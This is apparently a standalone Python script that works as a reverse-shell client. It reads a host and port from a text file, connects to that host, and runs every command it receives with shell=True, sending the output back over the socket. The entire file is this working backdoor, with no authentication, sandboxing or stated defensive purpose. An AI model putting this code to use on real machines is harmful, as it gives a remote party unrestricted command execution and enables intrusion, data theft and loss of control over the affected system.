import socket
import subprocess

FILENAME = 'server_info.txt'

def read_server_info_from_file():
    with open(FILENAME, 'r') as file:
        server_info = file.readline().strip().split(':')
    return server_info[0], int(server_info[1])

def connect_to_server():
    server_host, server_port = read_server_info_from_file()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((server_host, server_port))
        print(f"Connected to server {server_host}:{server_port}")
        while True:
            command = client_socket.recv(1024).decode()
            if not command:
                print("Empty command received")
                break
            print(f"Received command: {command}")
            output = subprocess.check_output(command, shell=True).decode()
            print(f"Processed command: {command}")
            print(f"Output: {output}")
            client_socket.sendall(output.encode())

if __name__ == "__main__":
    connect_to_server()
